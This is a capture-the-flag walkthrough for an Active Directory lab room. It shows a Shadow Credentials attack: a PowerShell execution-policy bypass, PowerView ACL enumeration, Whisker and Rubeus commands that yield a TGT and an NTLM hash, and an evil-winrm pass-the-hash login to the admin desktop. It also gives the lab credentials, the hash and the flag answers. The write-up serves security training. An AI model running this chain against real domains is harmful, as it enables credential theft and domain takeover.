# Day_11 [Active-Directory] Jingle Bells, Shadow Spells

+ Deployable Machine: Yes
+ RDP: Yes
  + UN: hr
  + PW: Passw0rd!

Description: AntarctiCrafts' technology stack was very specialised. It was primarily focused on cutting-edge climate research rather than prioritising robust cyber security measures. As the integration of the two infrastructure systems progresses, vulnerabilities begin to surface. While AntarctiCrafts' team displays remarkable expertise, their small size means they need to emphasise cyber security awareness. Throughout the room, you'll see that some users have too many permissions. We addressed most of these instances in the previous audit, but is everything now sorted out from the perspective of the HR user?

> IP: [10.10.50.186]

## LEARNING OBJECTIVES

1. Understanding Active Directory
2. Introduction to Windows Hello for Business
3. Prerequisites for exploiting GenericWrite privilege
4. How the Shadow Credentials attack works
5. How to exploit the vulnerability

## OVERVIEW

1. Active Directory 101
   1. Forensic McBlueActive Directory (AD) is a system mainly used by businesses in Windows environments. It's a centralised authentication system. The Domain Controller (DC) is at the heart of AD and typically manages data storage, authentication, and authorisation within a domain.
   2. You can think of AD as a digital database containing objects like users, groups, and computers, each with specific attributes and permissions. Ideally, it applies the principle of least privilege and uses a hierarchical approach to managing roles and giving authenticated users access to all non-sensitive data throughout the system. For this reason, assigning permissions to users must be approached cautiously, as it can potentially compromise the entire Active Directory. We'll delve into this in the upcoming exploitation section.

## STEPS

1. Deploy Machine
2. RDP into machine
3. POWERVIEW
   1. Launch the powershell script "powerview" and bypass default policy
      1. > powershell -ep bypass
      2. > . .\PowerView.ps1
   2. Run command to find interesting domain acl, specifically ones that are tied to the "HR" account
      1. > Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" }

         ```text
            ObjectDN                : CN=vansprinkles,CN=Users,DC=AOC,DC=local
            AceQualifier            : AccessAllowed
            ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
            ObjectAceType           : None
            AceFlags                : None
            AceType                 : AccessAllowed
            InheritanceFlags        : None
            SecurityIdentifier      : S-1-5-21-1966530601-3185510712-10604624-1115
            IdentityReferenceName   : hr
            IdentityReferenceDomain : AOC.local
            IdentityReferenceDN     : CN=hr,CN=Users,DC=AOC,DC=local
            IdentityReferenceClass  : user
         ```

      2. > Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights

         ```text
            IdentityReferenceName ObjectDN                                                    ActiveDirectoryRights
            --------------------- --------                                                    ---------------------
            hr                    CN=vansprinkles,CN=Users,DC=AOC,DC=local ListChildren, ReadProperty, GenericWrite
         ```

         1. In here we can see that the "HR" user has "GenericWrite" rights which we can exploit
4. EXPLOIT
   1. WHISKER
      1. Launch whisker but add the target vansprinkles from the previous step
         1. > .\Whisker.exe add /target:vansprinkles

            ```bash
               Rubeus.exe asktgt /user:vansprinkles /certificate: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 /password:"PJSGFe14oMLwYJw0" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
            ```

            1. We vcan now use this for a pass-the-hash" attack
   2. RUBEUS
      1. Run the command generated in the previous step
         1. > Rubeus.exe asktgt /user:vansprinkles /certificate:MIIJwAIBAzCCCXwGCSqGSIb3DQEHAaCCCW0Egg... /password:"PJSGFe14oMLwYJw0" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show

            ```text
                  ______        _
               (_____ \      | |
                  _____) )_   _| |__  _____ _   _  ___
               |  __  /| | | |  _ \| ___ | | | |/___)
               | |  \ \| |_| | |_) ) ____| |_| |___ |
               |_|   |_|____/|____/|_____)____/(___/

               v2.2.3

               [*] Action: Ask TGT

               [*] Using PKINIT with etype rc4_hmac and subject: CN=vansprinkles
               [*] Building AS-REQ (w/ PKINIT preauth) for: 'AOC.local\vansprinkles'
               [*] Using domain controller: fe80::e91e:3459:426:5d51%5:88
               [+] TGT request successful!
               [*] base64(ticket.kirbi):

                     doIF4DCCBdygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoQsbCUFPQy5MT0NBTKIeMBygAwIB
                     AqEVMBMbBmtyYnRndBsJQU9DLmxvY2Fso4IEuDCCBLSgAwIBEqEDAgECooIEpgSCBKLkHNdojwFxDFzm
                     cEnpZk73BzDEb3PcdSB+WSJJBSlloFJ/5rlH20IF1lG+GJN1eBg1oNpJx9icL5yoJju2hejfd6MqDbRp
                     Cqd6qEQ2BLoMACJE+y+Y0+sfuBH6xjZHrMor81Lpk0aOtaCgLR5vQoPTd5JP/Kb/6RF1OxkMNLp29HRq
                     6mRE0+e/O/LUjJoz1L5R3Aot3iO7BkMOKLRzldoFK8o3aOa13ovKyp+Ly9I/jmzDYhoT4UEDJ0NUbtya
                     vmqkBEZJpTuWNDD9qkjMr1DbOo7ZsLgFuHL/UK14OU3bIjzyAaJT5DZP18jRPkjt6Ie3cWEK/OaW4zJ7
                     FuHWOI7KInEeE10GKuBYjCB/j4cLyX8Iwhyf2BDcE+tIYDtwTrWy+dYUr1fY9ybSIKWO/nd99hd3WuN7
                     PGJckpqvNrxJ5homFoz6U1h7MDm5SlbzxlwdyQp+rqFmg5f0J0PS1z16GYMSP+MsWd/CSpg0eXCnzVkK
                     yuPgbXgwWPPISRbbWVo64lOcWOOdyeph5q3zvOsIvMOU/o0h+Dy+5+rkB/8IzY57tbIgUtaZ4vp9KaiM
                     yGKOzupNNNcs4N1+6sGDeLaUKWJyZqkmLGjkhnh417rgezcQPBFiElYbZlK1/HUzTyFvbUn30ZPWcKtU
                     fz/7HT7x5nXnQzetGkU3FOKCEAop+ZWK2ocrv/Q7bAumG4vI/hvf6PnT1yeKsh693LFt9piRhlPCwG86
                     39oTHAv0VueOVXjJ9pU7M0xMtPtjLM616zpZi2Ve85RIHwvvyUu9AKm5zvdcx9XoOBRdqLZw/ldKIByz
                     vj7096ZO5I3AZrfHT7D/P8eU1R6/g9FdoHMaW99kVUT3u1jYoFO+IqlRbf9QLayh6xGwJydEuFxIdfqG
                     nt6k0xlobwus5ArfVosjNLoAb881QyLIX8t5e0s4XKbwYBEMalKSHzzW1gaIdMyS/7oB+VpgFsWaVgz1
                     869x1lIeVfTkDWc8Qv756U8w3QF+9Sau0xH93k7gmpQrMDofhrKuzbuaXHMYgFcn5/a0000TxcqWyFgi
                     gLWX5mQqrL9rqAalMIVfaq4xOMb8U62zo3u9Sixphok0pvQ5IppDUbaO/WZlcofz4i2Wuz+q5K1ZQPb3
                     1SHah0KAPyE+e6zryU2xLFdYEPWAmlN8R47T11VshHvkjdGhp9/TiXa6JZF9yetZQjmj7sGQ4S8d/L/k
                     oMRgpZfaWC35622waLlcnrmy1PADHZEayN+6sM3q99QJtY3l+fAH1+b4WkOUsMvdXwpfNRsH4tessoGb
                     WzMIr/CH77/dTQFec0x2yGZGuxmfS5GZVO09ytVB5rXF4ysIdnKjMuKuChZOE0CZQ6plA6qZjCcRMqO/
                     X2SOkIhR6E+IPspXEeQrrJXuja1KMLwIDpR7WljC/PJt5PCGfhX5Bh0rprWCT8tmAZ4GjWCtPy5s46Sn
                     vRU9tnIKOgF6mZZMEFeyUyumKAubww3EW4JTM1sPV9jQvmq3H/TL35Dp6YnMXSND1XYshxoYUFj1S1y0
                     yIk96WK6RZdcOcgbHTugJiWpwyCz236kMLl19nbJ+r59+G4jo4HRMIHOoAMCAQCigcYEgcN9gcAwgb2g
                     gbowgbcwgbSgGzAZoAMCARehEgQQJtg9VN6IwM3Sq1Lc/zIKdKELGwlBT0MuTE9DQUyiGTAXoAMCAQGh
                     EDAOGwx2YW5zcHJpbmtsZXOjBwMFAEDhAAClERgPMjAyMzEyMTgxOTMyMjlaphEYDzIwMjMxMjE5MDUz
                     MjI5WqcRGA8yMDIzMTIyNTE5MzIyOVqoCxsJQU9DLkxPQ0FMqR4wHKADAgECoRUwExsGa3JidGd0GwlB
                     T0MubG9jYWw=

               ServiceName              :  krbtgt/AOC.local
               ServiceRealm             :  AOC.LOCAL
               UserName                 :  vansprinkles
               UserRealm                :  AOC.LOCAL
               StartTime                :  12/18/2023 7:32:29 PM
               EndTime                  :  12/19/2023 5:32:29 AM
               RenewTill                :  12/25/2023 7:32:29 PM
               Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
               KeyType                  :  rc4_hmac
               Base64(key)              :  Jtg9VN6IwM3Sq1Lc/zIKdA==
               ASREP (key)              :  5A359EEBBFDFE830B41B12BB4EC4153B

               [*] Getting credentials using U2U

               CredentialInfo         :
                  Version              : 0
                  EncryptionType       : rc4_hmac
                  CredentialData       :
                     CredentialCount    : 1
                     NTLM              : 03E805D8A8C5AA435FB48832DAD620E3
            ```

            1. Now we can attack pass-the-hash
   3. EVIL-WINRM
      1. From our attack machine lets run
         1. > evil-winrm -i 10.10.50.186 -u vansprinkles -H 03E805D8A8C5AA435FB48832DAD620E3
         2. SUCCESS! We are now in!
5. FLAG
   1. Now lets grab the flag from admin desktop
      1. > cd C:\Users\Administrator\Desktop
      2. > cat flag.txt
         1. FLAG: `THM{XMAS_IS_SAFE}`


## QUESTIONS

1. What is the hash of the vulnerable user?
   1. `03E805D8A8C5AA435FB48832DAD620E3`
2. What is the content of flag.txt on the Administrator Desktop?
   1. `THM{XMAS_IS_SAFE}`